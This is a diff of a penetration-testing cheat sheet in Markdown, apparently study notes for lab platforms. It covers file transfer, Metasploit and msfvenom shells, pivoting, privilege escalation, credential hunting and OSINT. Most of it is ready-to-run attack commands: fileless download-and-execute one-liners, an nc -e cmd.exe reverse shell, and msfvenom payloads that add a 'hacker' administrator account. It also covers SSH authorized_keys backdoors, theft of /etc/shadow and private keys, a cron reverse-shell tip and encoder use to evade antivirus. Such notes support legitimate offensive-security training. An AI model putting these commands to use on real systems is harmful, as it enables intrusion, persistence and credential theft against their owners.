-It is useful in Active Directories, in which you have local hostnames and you want to do a lateral move.
-
-**This is only useful if you cannot directly transfer to a certain hostname**
-
-1. Transfer the file on the *pivot box*, that is the IP you can connect to
-
-1. Create a Remote session in the target machine
-
-   ```powershell
-    $Session = New-PSSession -ComputerName [HostName]
-   ```
-
-2. Transfer from the pivot box, to the hostname
-
-   ```powershell
-   Copy-Item -Path [FiLE_PATH] -ToSession $Session -Destination [PATH]
-   ```
-
-   
-
-### Upload
-
-#### Base 64
-
-1. Encode with Powershell
-
-   ```powershell
-   [Convert]::ToBase64String((Get-Content -path "[PATH]" -Encoding byte))
-   ```
-
-2. Check MD5 hash to check later if the procedure was successsfull
-
-   ```powershell
-   Get-FileHash "[PATH]" -Algorithm MD5 | select Hash	
-   ```
-
-3. Copy paste point 1. and decode in your machine
-
-   ```bash
-   echo [STRING] | base64 -d > hosts
-   ```
-
-4. Check if the procedure was correct by comparing with 2.:
-
-   ```bash
-   md5sum hosts
-   ```
-
-#### Powershell - python server
-
-1. Open a server
-
-   ```bash
-   python3 -m uploadserver
-   ```
-
-2. Upload via Invoke-RestMethod
-
-   ```cmd
-   > IEX(New-Object Net.WebClient).DownloadString('[LINK]')
-   > Invoke-FileUpload -Uri http://[IP]/upload -File [FILE PATH]
-   ```
-
-#### Powershell - netcat + base64
-
-1. Open netcat listener
-
-   ```bash
-   listen 8000	
-   ```
-
-2. Send the file by using `Invoke-WebRequest` or `Invoke-RestMethod` in base 64
-
-   ```powershell
-   > $b64 = [System.convert]::ToBase64String((Get-Content -Path '[PATH]' -Encoding Byte))
-   > Invoke-WebRequest -Uri http://[IP]/ -Method POST -Body $b64
-   ```
-
-3. Decode
-
-   ```bash
-   echo <base64> | base64 -d -w 0 > hosts
-   ```
-
-#### SMB - WebDav
-
-Commonly enterprises don't allow the SMB protocol (TCP/445) out of  their internal network because this can open them up to potential  attacks. An alternative is to run SMB over HTTP with `WebDav`.
-
-1. Open WebDav
-
-   ```bash
-   sudo wsgidav --host=0.0.0.0 --port=[PORT] --root=/tmp --auth=anonymous 
-   ```
-
-2. Connect to WebDav
-
-   ```powershell
-   > dir \\[IP]\DavWWWRoot
-   ```
-
-3. Upload with SMB
-
-   ```powershell
-   > copy [FILE] \\[IP]\DavWWWRoot\
-   ```
-
-#### FTP
-
-1. Open FTP server with write 
-
-   ```bash
-   sudo python3 -m pyftpdlib --port 21 --write
-   ```
-
-2. Powershell to upload
-
-   ```powershell
-   (New-Object Net.WebClient).UploadFile('ftp://[IP]/ftp-hosts', 'FILE')
-   ```
-
-3. If the shell is not interactive, upload with a FTP Command File:
-
-   ```cmd-session
-   C:\htb> echo open 192.168.49.128 > ftpcommand.txt
-   C:\htb> echo USER anonymous >> ftpcommand.txt
-   C:\htb> echo binary >> ftpcommand.txt
-   C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
-   C:\htb> echo bye >> ftpcommand.txt
-   C:\htb> ftp -v -n -s:ftpcommand.txt
-   ftp> open 192.168.49.128
-   
-   ftp> USER anonymous
-   ftp> PUT c:\windows\system32\drivers\etc\hosts
-   ftp> bye
-   ```
-
-## Linux
-
-### Download
-
-#### Native binaries
-
-https://gtfobins.github.io/
-
-#### wget/cURL (file) 
-
-```bash
-wget [LINK] -O [OUTPUT PATH]
-```
-
-```bash
-curl [LINK] -o [OUTPUT PATH]
-```
-
-#### wget/cURL (fileless)
-
-```bash
-wget [LINK] -O | [COMMAND]
-```
-
-```bash
-curl [LINK] -qO- | [COMMAND]
-```
-
-The `COMMAND` is e.g. `bash` or `python3`, that is, what executes the file in the link. Can also be used with a parser, such as `jq '.'`.
-
-#### Netcat
-
-1. Start netcat on the target
-
-   ```bash
-   nc -lvnp 8000 --recv-only > [FILE]
-   ```
-
-   If the compromised machine is using Ncat,specify `--recv-only` to close the connection once the file transfer is finished.
-
-2. On our machine, we upload the file on netcat
-
-   ```bash
-   nc --send-only [IP] [PORT] < [FILE]
-   ```
-
-If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html). Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.
-
-1. Open listener on you machine
-
-   ```bash
-    sudo ncat -l -p 443 --send-only < SharpKatz.exe
-   ```
-
-2. On the target:
-
-   ```bash
-   cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
-   ```
-
-#### Base64
-
-In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from  downloading a file from our machine. 
-
-We can encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it.
-
-1. Encode the file
-
-```bash
-cat [FILE] |base64 -w 0;echo
-```
-
-2. Copy the string
-
-3. Go on the remote host, decode
-
-```bash
-echo -n [STRING] | base64 -d > [FILE_NAME]
-```
-
-**Validate Transfer**
-
-`file`: validates the format of a file
-
-`md5sum` validates the hash of the filestomi
-
-#### Bash /dev/tcp
-
-As long as Bash version 2.04 or greater is installed (compiled with  --enable-net-redirections), the built-in /dev/TCP device file can be  used for simple file downloads.
-
-1. Connect to the target Webserver
-
-   ```bash
-   exec 3<>/dev/tcp/[IP]/[PORT]
-   ```
-
-2. HTTP GET Request
-
-   ```bash
-   echo -e "GET [FILE] HTTP/1.1\n\n">&3
-   ```
-
-3. Print the response
-
-   ```bash
-   cat <&3
-   ```
-
-#### SSH
-
-`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username,  the remote IP address or DNS name, and the user's credentials.
-
-1. Enable SSH server
-
-   ```bash
-   sudo systemctl enable ssh
-   ```
-
-2. Start the server
-
-   ```
-   sudo systemctl start ssh
-   ```
-
-3. Check for listening port
-
-   ```bash
-   netstat -lnpt
-   ```
-
-4. Download
-
-   ```bash
-   scp user@remotehost:[FILE_PATH]
-   ```
-
-### Upload
-
-#### Web Upload
-
-1. Create self-signed certificate
-
-   ```bash
-   openssl req -x509 -out /tmp/server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
-   ```
-
-2. Start Web Server in a new folder
-
-   ```bash
-   mkdir /tmp/https && cd /tmp/https
-   sudo python3 -m uploadserver 443 --server-certificate /tmp/server.pem
-   ```
-
-3. Upload (multiple files can be specified)
-
-   ```bash
-   curl -X POST https://[IP]/upload -F 'files=@[FILE]' --insecure
-   ```
-
-   `--insecure` since we used a self-signed certificate that we trust.
-
-#### Server upload
-
-1. Run a server on my machine
-
-   ```bash
-   # Different methods depending on what is available on the target
-   python3 -m http.server 8000	
-   python2.7 -m SimpleHTTPServer
-   php -S 0.0.0.0:8000
-   ruby -run -ehttpd . -p8000
-   ```
-
-- Download from the target
-
-  ```bash
-  curl [URL] -o [FILE_NAME]
-  ```
-
-#### SCP
-
-```bash
-scp [FILE] user@targethost:[OUTPUT LOCATION]
-```
-
-## Programming Languages
-
-### Download
-
-#### Python 
+##### Python 
 
 ```bash
 python3 -c 'import urllib.request;urllib.request.urlretrieve("[LINK]", "[FILE]")'
 ```
 
+**Upload:** 
+
+1. Start a python server
+
+   ```bash
+   python3 -m uploadserver
+   ```
+
+2. Upload:
+
+   ```bash
+   python3 -c 'import requests;requests.post("[MY URL]",files={"files":open("[FILE]","rb")})'
+   ```
+
 You can also use `python2.7`
 
 Notice that the `LINK` should include the path including the file.
 
-#### php
+##### php
 
 File_get_contents()
 
@@ -3630,19 +3069,19 @@ Pipe to Bash
 php -r '$lines = @file("[LINK]"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
 
-#### Ruby                                                                                                                    
+##### Ruby                                                                                                                    
 
 ```bash
 ruby -e 'require "net/http"; File.write("[FILE]", Net::HTTP.get(URI.parse("[LINK]")))'
 ```
 
-#### Perl                                                                                                                         
+##### Perl                                                                                                                         
 
 ```bash
 perl -e 'use LWP::Simple; getstore("[LINK]", "FILE");'
 ```
 
-#### Javascript
+##### Javascript
 
 1. create a file called `wget.js` and save the following content:
 
@@ -3663,7 +3102,7 @@ perl -e 'use LWP::Simple; getstore("[LINK]", "FILE");'
    cscript.exe /nologo wget.js [LILNK] [FILE]
    ```
 
-#### VBScript
+##### VBScript
 
 1. create a file called `wget.vbs` and save the following content:
 
@@ -3687,29 +3126,719 @@ perl -e 'use LWP::Simple; getstore("[LINK]", "FILE");'
    cscript.exe /nologo wget.js [LILNK] [FILE]
    ```
 
-### Upload
+### Shells
 
-#### Python
+#### Metasploit 
 
-1. Start a python server
+- Staged (more stable):   
 
-   ```bash
-   python3 -m uploadserver
-   ```
+  `set payload windows/[EMPTY/X64]/shell/[BIND/REVERSE]_tcp`
 
-2. Upload
+- Stageless (sthelthier): 
 
-   ```bash
-   python3 -c 'import requests;requests.post("[MY URL]",files={"files":open("[FILE]","rb")})'
-   ```
+  `set payload windows/[EMPTY/X64]/shell_[BIND/REVERSE]_tcp`
 
-The same procedure holds for the other languages.
+#### SMB / WebDAV
+
+- `smbserv()`                                          → Open Anonymous Server
+- `cp /usr/share/windows-binaries/nc[32/64].exe .`    → Place NC in SMB Share
+- `\\[KALI_IP]\nc64.exe -e cmd.exe [KALI_IP] [PORT]`  → Input NC Shell Payload
+- WebDAV Method                                  → `webdavserv()` + `\\[KALI_IP]:8000\DavWWWRoot\`  
+
+#### Powershell
+
+- `powershell -c iex(New-Object System.Net.WebClient).DownloadString('http://[SERVER]/[PS1_FILE]');[FUNCTION_CALL]`
+- `powershell [-e / /enc] [B64_STRING]`                     → [B64 Reverse Shell](https://www.revshells.com/)
+- `echo '[CMD]' | iconv -f ascii -t utf-16le | base64 -w0`  → CMD to PS-B64 Conversion
+
+#### Admin Hijacking
+
+- `msfvenom -p windows/[x64/empty]/exec CMD="net user hacker pass123 /add" -f [FORMAT]`
+- `msfvenom -p windows/[x64/empty]/exec CMD="net localgroup Administrators hacker /add" -f [FORMAT]`
+- `msfvenom -p windows/[x64/empty]/exec CMD="net group [DOMAIN_GROUP] hacker /add" -f [FORMAT]`
+- Remote Access → Add `hacker` to RDP / WinRM Groups
+
+#### SSH Hijacking
+
+- `ssh-keygen -t ed25519 -f [KEY_FILE]` → Paste in `C:\Users\[USERNAME]\.ssh\authorized_keys`
+- `chmod 600 [KEY_FILE]`
+- `ssh -i [KEY_FILE] [USER]@[IP]`
+
+#### MSFVenom
+
+- Executable Upload
+  - `metash()`
+  - IIS           → ASP / ASPX
+  - CMD        → EXE / DLL / MSI / PS1
+  - Link/Macro  → HTA / VBA / VBS
+  - PHP         → `-p php/meterpreter/reverse_tcp -f raw`
+  - WAR        → `-p java/shell_reverse_tcp -f war`
+  - JSP          → `-p java/shell_reverse_tcp -f raw`
+- BOF Shellcode
+  - `-a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [32_BIT_ENCODER] -i 3 --smallest` → Place in Exploit
+  - Encoders      → `x86/shikata_ga_nai` / `x86/unicode_m`
+  - Extra Options  → `BufferRegister=EAX` / `Exitfunc=thread`
+  - Auto-Migration
+    - Useful when Process Crashes
+    - `echo "run post/windows/manage/migrate" > ~/automigrate.rc`
+    - In `multi/handler` MSF Panel → `set AutoRunScript multi_console_command -r ~/automigrate.rc`
+
+## Metasploit
+
+### Sessions
+
+Multiple sessions can be handled:
+
+in `msfconsole`:
+
+```bash
+sessions			# visualize active session
+sessions -i [no.]	# switch session
+```
+
+Background the current session with `[CTRL] + [Z]`
+
+The `jobs` command lets you handle active jobs:
+
+- An exploit can be run as a job by typing `exploit -j`
+- To list all running jobs  `jobs -l` 
+
+- To kill a specific job  `kill [index no.]` 
+- `jobs -K`  to kill all running jobs.
+
+### Search
+
+In `msfconsole`:
+
+```bash
+search [exploit]
+
+use [number exploit]
+info
+options
+
+show target				# show OS/language version/service pack
+set target [alue]
+
+set [option] [value]	# use setg to set permanently
+
+run
+```
+
+In the search we can specify 
+
+- the  year (`cve:<year>`), 
+- the platform Windows (`platform:<os>`), 
+- the type of module we want to find (`type:<auxiliary/exploit/post>`), 
+- the reliability rank (`rank:<rank>`), 
+- the search name (`<pattern>`). 
+
+| **Type**    | **Description**                                              |
+| ----------- | ------------------------------------------------------------ |
+| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
+| `Encoders`  | Ensure that payloads are intact to their destination.        |
+| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
+| `NOPs`      | (No Operation code) Keep the payload sizes consistent across exploit attempts. |
+| `Payloads`  | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
+| `Plugins`   | Additional scripts can be integrated within an assessment with `msfconsole` and coexist. |
+| `Post`      | Wide array of modules to gather information, pivot deeper, etc. |
+
+### Import module
+
+To import an exploit from `searchsploit`:
+
+```bash
+searchsploit [exploit]	#get exploit path
+cd /usr/share/metasploit-framework/modules
+mkdir [exploit path]	# create the full exploit path inside msf
+cd [exploit path]
+searchsploit -m [exploit_number]	# copies the exploit
+msfconsole
+	>use [exploit path]
+```
+
+### Payloads
+
+Module that aids the exploit module in (typically) returning a shell to the attacker. Whether or not a payload is staged is represented by `/` in the payload name.
+
+- Singles: contains the exploit and the entire shellcode 
+- Stagers: staged payload that  typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. 
+- Stages: payload components that are downloaded by stager's modules.
+
+in `msfconsole`
+
+```bash
+grep [search value 1] grep [search value 2] show payloads
+set payload [no.]
+
+show options
+show encoders 	# See below
+run
+```
+
+#### Linux
+
+- Staged (more stable):   
+
+  `set payload linux/[x86/X64]/shell/[BIND/REVERSE]_tcp`
+
+- Stageless (sthelthier): 
+
+  `set payload linux/[x86/X64]/shell_[BIND/REVERSE]_tcp`
+
+#### Windows
+
+- Staged (more stable):   
+
+  `set payload windows/[EMPTY/X64]/shell/[BIND/REVERSE]_tcp`
+
+- Stageless (sthelthier): 
+
+  `set payload windows/[EMPTY/X64]/shell_[BIND/REVERSE]_tcp`
+
+#### Encoders
+
+Encoders change the payload to:
+
+-  run on different operating systems and architectures. 
+-  remove hexadecimal opcodes known as `bad characters`.
+-  help with the AV detection
+
+Shikata Ga Nai (`SGN`) is one of the most utilized Encoding.
+
+`msfvenom` takes care of payload generation and Encoding, by adding the flag `-e`, e.g. if the architecture is `x86`:
+
+```bash
+-e x86/shikata_ga_nai
+```
+
+Also, the flag `-i [number of iteration]` is useful to run the encoding multiple times, in order to evade AV.
+
+To test if your malware is undetectable (FUD) enough: https://antiscan.me/
+
+### Plugins
+
+Found in `/usr/share/metasploit-framework/plugins`
+
+In `msfconsole`:  -> `load [plugin]`
+
+### Meterpreter migration (Windows)
+
+in `meterpreter`, when the shell doesn't appear:
+
+```bash
+ps		# List processes
+steal_token [PID of process network or local service]
+```
+
+# Privilege Escalation
+
+One excellent resource is [HackTricks](https://book.hacktricks.xyz), which has an excellent checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation. 
+
+**Scripts**
+
+- Linux
+  - [Linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (enum)
+  - [LinEnum](https://github.com/rebootuser/LinEnum.git) (enum)
+  - [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (enum)
+  - [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
+- Windows
+  -  [Seatbelt](https://github.com/GhostPack/Seatbelt) (enum)
+  -  [JAWS](https://github.com/411Hall/JAWS) (enum)
+  -  [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+
+## Pivoting
+
+A way to access services that cannot be accessed by the outside
+
+Kali -> Pivot Host -> Intranet Host (private)
+
+The <PivotIntranetIP> is the private IP of the Pivot Host that can communicate with the Intranet Host, that is the two IPs share the first blocks, while the <IP> is the public one, that you can already connect to.
+
+#### Local forwarding
+
+Send a local service to your machine. 
+
+- **Ligolo**
+
+  1. On your machine, run `ligstart` to start the ligolo server
+
+  2. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`
+
+  3. On the target:
+
+     ```bash
+     ./agent -connect [TUNIP]:[LigoloPort] -ignore-cert
+     ```
+
+  4. On the ligolo server:
+
+     ```
+     session
+     # Select the session
+     start 
+     ```
+
+  5. On you PC, add the route
+
+     ```bash
+     sudo ip route add 240.0.0.1 dev ligolo
+     ```
+
+  6. Access any local port on `240.0.0.1:[PORT]`
+
+- **SSH**
+
+  ```bash
+  ssh -L [ATTACKER_PORT]:[INTRANET_IP]:[TARGET_PORT] [USER]@[IP] -fN
+  ```
+
+  - `INTRANET_IP` is a private IP, usually 127.0.0.1
+
+  - `-fN` to background the ssh terminal
+
+  - `-L` can be specified multiple times
+
+#### Dynamic forwarding
+
+Access private subnetworks of the target. Forwards all the service of the private subnetworks to you.
+
+On the target machine, run `ifconfig` to see if there is a private network open. Then check the CIDR of the private networks:
+
+- Linux -> `ip route`
+- Windows -> `route -n`
+
+Tools:
+
+- **Ligolo**: Win/Lin only 64bit
+
+  1. To get the `CIDR` , note the corresponding intranet IP with `ip route`
+
+  2. On your machine, run `ligstart` to start the ligolo server
+
+  3. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`
+
+  4. On the target:
+
+     ```bash
+     ./agent -connect [TUNIP]:[LigoloPort] -ignore-cert
+     ```
+
+  5. On the ligolo server:
+
+    ```
+  session
+  # Select the session
+  start 
+    ```
+
+  6. On you PC, add the route
+
+    ```bash
+  sudo ip route add [CIDR] dev ligolo
+    ```
+
+- **SSH**
+
+  1. Enable dynamic forwarding
+
+     ```bash
+     ssh -D 9050 [USER]@[IP] [-i KEY]
+     ```
+
+  2. Add the port of `proxychains` in `/etc/proxychains4.conf`
+
+     ```bash
+     [PROXY] 127.0.0.1 9050	
+     ```
+
+  3. To discover internal hosts, do a local ping sweep on the pivot target:
+
+     - Linux:
+
+     ```bash
+     for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+     ```
+
+     - Windows:
+
+     ```cmd
+     %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+     ```
+
+  4. Run `nmap` (we can only perform a TCP connect scan over proxychains) 
+
+     ```bash
+     sudo proxychains nmap -v -Pn -sT [IP]
+     ```
+
+  5. Interact through `proxychains` with other services eg:
+
+     `sudo proxychains firefox-esr`
+
+     `sudo proxychains ftp [INTERNAL_FTP_IP]`
+
+  6. Alternatively, enter in a proxychained ZSH so you don't have to type everytime
+
+     `proxychains zsh`
+
+  7. To discover alive hosts in the internal network, do a local ping sweep on the pivot host
+
+- **Rpivot** (SOCKS tunneling)
+
+  1. On Kali, run server.py
+
+     ```bash
+     python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+     ```
+
+  2. Transfer `rpivot` to the target `scp -r rpivot`
+
+  3. Run client.py on the Pivot
+
+     ```bash
+     python2.7 client.py --server-ip <tunip> --server-port 9999
+     ```
+
+  4. Use proxychains
+
+- **Metasploit**
+
+- **plink.exe**
+
+- **sshuttle**
+
+- **chisel**: Win/Lin also 32bit
+
+- **netsh**
+
+- **socat**
+
+#### Remote/reverse forwarding
+
+Forward a local service to a remote port. Usually used to gain shells or exchange files from the pivoted hosts to other targets that are only reachable from the pivot hosts via dynamic forwarding.
+
+- **Ligolo**
+
+  1. On your machine, run `ligstart` to start the ligolo server
+
+  2. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`
+
+  3. On the target:
+
+     ```bash
+     ./agent -connect [TUNIP]:[LI] -ignore-cert
+     ```
+
+  4. On the ligolo server:
+
+     ```
+     session
+     # Select the session
+     start 
+     ```
+
+  5. On the legolo server, add the listener
+
+     ```bash
+     listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:8000 --tcp 
+     ```
+
+  6. Open listener
+
+     ```bash
+     listen 8000 	# netcat
+     httpserv 8000	# hhtp 
+     ```
+
+  7. Request payload on `<PivotIntranetIP>:30000`
+
+- **SSH** (e.g. for a rev shell)
+
+  1. Generate a payload with <PayloadPort> and <IntranetIP>
+
+  2. Transfer the payload from Kali -> comprised host -> private host
+
+  3. On Kali, open a listener on <ListenPort>
+
+  4. Connect to the Pivot and forward the connection from the pivot to you 
+
+     ```bash
+     ssh -R <PivotIntranetIP>:<PayloadPort>:0.0.0.0:<ListenPort> <User>@<IP> -vN
+     ```
+
+- **chisel**
+
+- **Metasploit**
+
+- **Socat**
+
+## Linux
+
+### Users
+
+- Users `cat /etc/passwd | grep sh` and `ls  /home`
+- User Group:
+
+  -  `id` and what can that group do
+  -  [interesting_groups](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe)
+
+### Privileges
+
+Search on [gtfobins](https://gtfobins.github.io) bin files with relative privileges
+
+##### sudo
+
+```bash
+sudo -l		 # List sudo privileges
+
+sudo su 	 # Switch to the root user 
+su [USER] 	 # Switch to a local user
+sudo -u [USER] [COMMAND] 	# Execute an application as an user
+```
+
+- **Symlinks attacks**
+
+  A symlink is a link to a file `ln -s [FILE_target] [FILE_link]`
+
+  The `*` character gets expanded to all the matching files.
+
+  
+
+  Examples:
+
+  - `chown` and `chmod`
+
+    - `chown [USER] [FILE]`
+
+      Sets the owner of the specified `[FILE]` to the `[USER]`.
+
+    - `chown [USER] [FILE] --reference=[REF FILE]`
+
+      Sets the owner of the specified `[FILE]` to match the owner of the `[REF FILE]`, `[USER]` is ignored.
+  
+    ```bash
+    # Create a file reference owned by us
+    touch reference
+    # Create a file called as the flag of chown
+    touch -- --reference=reference
+    ```
+
+    If you create a symlink to **/etc/passwd** in the same directory, then the owner of /etc/passwd will also be you.
+    
+    
+
+  Avoid checks:
+  
+  - If there is a check to control if the link is linking to a priviledged folder, you can do a double link:
+  
+    ```bash
+    ln -s /root/root.txt [FILE HOP]	# Creates a link to root.txt
+    ln -s [FILE HOP] [FILE]			# Creates a link to FILE HOP
+    ```
+
+##### suid
+
+`find / -perm -u=s -type f 2>/dev/null`: checks for *SUID binaries* 
+
+### Credential Hunting
+
+- Some files worth checking:
+
+  - `configuration` files
+  - `log` files, 
+  - `bash_history` 
+
+- Search credentials in folder and subfolders:
+
+  ```bash
+  grep -rniH "[STRING]" [PATH] [-e REGEX]
+  ```
+
+  - `-r` recursive
+  - `-n` output the line number
+  - `-i` case insensitive
+  - `-H`  output the content
+
+  Credentials are variable assignments, which are made of:
+
+  - name: password, credential, pass, psw, token, key, secret
+  - separator: =, : (with or without space)
+  - quotes
+
+  Some examples:
+
+  ```bash
+  grep -rniH "password = '" .		# string assignment (try also with \")
+  grep -rniH "password':" . 		# dictionary assignment
+  grep -rniH "password'," .		# tuple assignment
+  ```
+
+- Shadow Hashes `/etc/shadow` 
+
+### Files
+
+- Readable / Owned web files (for web application)
+
+  - `find /var/www -type f -group [group] 2>/dev/null`  
+
+  - `find /var/www -type f -user [user] 2>/dev/null`
+
+  - `find /var/www -type f -readable 2>/dev/null`
+
+  - `/proc` and `sis` `run` not interesting
+
+- Scheduled Tasks:
+
+  **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
+
+  - `/etc/crontab`
+  - `/etc/cron.d`
+  - `/var/spool/cron/crontabs/root`
+
+- SSH keys:  
+
+  - Read: copy it from `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`
 
 
+  ```bash
+  $ chmod 600 id_rsa	# More restrictive permission
+  $ ssh root@10.10.10.10 -i id_rsa
+  $ nano id_rsa	# open and copy on your machine
+  ```
+
+  - Write: place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`
+
+
+  ```bash
+  ssh-keygen -f key	#Generate a key in the output file key
+  ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
+  ssh user@10.10.10.10 -i key	# Login
+  ```
+
+### Local Network Services
+
+- `netstat -puntal` or `ss -puntal` (access/ tunnel)
+
+
+Look at `LISTEN` ports
+
+### Local Processes
+
+- `ps -aux | grep [USER, ROOT...]`
+- `ps -aux` look for local databases
+
+### OS 
+
+- Kernel Exploits
+
+- Vulnerable Software: `dpkg -l` 
+
+## Windows
+
+### Users
+
+- Users & Groups
+  - `net user`
+  - `net localgroup`
+  - `net user [USER]`
+- Memberships & Privileges
+
+  -  `whoami /all`
+  -  Check non-default groups -> [Exploits](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)
+  -  Check non-default privileges -> [Exploits](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+     - `SeDebug`
+     - `SeBackup`
+     - `SeImpersonate` / `SeAssignPrimaryToken`
+     - `SeRestore`
+     - `SeManage`
+
+### Credential Hunting:
+
+- Check locations:
+
+  - Desktop: `cd C:\Users\[USER]\Desktop`
+
+  - configuration fikes
+
+  - log files
+
+  - History `PSReadLine`
+
+- Saved passwords `cmdkey /list`
+
+  ````cmd
+  runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+  ````
+
+- `tree /a /f c:\users`
+
+### Files
+
+- Readable / Owned web files (for web application)
+
+  - SSH keys:  
+
+    - Read: copy it from `file:///c:/users/[USERNAME]/.ssh/id_rsa`
+
+      ```bash
+      $ chmod 600 id_rsa	# More restrictive permission
+      $ ssh root@10.10.10.10 -i id_rsa
+      $ nano id_rsa	# open and copy on your machine
+      ```
+
+    - Write: place our public key in the user's ssh directory at `file:///c:/users/[USERNAME]/.ssh/authorized_keys`
+
+      ```bash
+      ssh-keygen -f key	#Generate a key in the output file key
+      ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
+      ssh root@10.10.10.10 -i key	# Login
+      ```
+
+
+### Local Network Services
+
+- `systeminfo`
+
+### Local Processes
+
+- `tasklist` to check the processes
+
+- `netstat -ano` to check the services
+- `route -n` to check the routing table
+
+### Local Applications
+
+Relevant directories:
+
+- `C:`
+  - `inetpub\wwwroot` web application folder
+  - `inetpub\ftproot` ftp root application
+  - custom folders
+- `C:/Program Files` and `C:/Program Files (x86)`
+  - custom/non default applications
+- `C:/ProgramData`
+- `C:/Users/[USERNAME]/appdata`
+
+### OS
+
+
+- Kernel Exploits
+
+  - In meterpreter: local exploit suggester module
+- Vulnerable Software:  `C:\Program Files` 
+
+## Jail Brekout
+
+### Docker
+
+To check if you are in a docker container type `hostname`. A docker has a random string as hostname.
+
+- If you are root you can read the shadow password file `/etc/shadow`
 
 # OSINT
 
-## Google search
+## Google Dorks
 
 | Operator                | Operator Description                                         | Example                                             | Example Description                                          |
 | ----------------------- | ------------------------------------------------------------ | --------------------------------------------------- | ------------------------------------------------------------ |
@@ -3821,3 +3950,4 @@ The same procedure holds for the other languages.
 
   -  [domain.glass](https://domain.glass) 
   -  [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud  storage, and even sort and filter by file format. Therefore, once we  have found them through Google, we can also search for them on  GrayHatWarefare and passively discover what files are stored on the  given cloud storage. SSH keys could be also leaked here.
+  -  
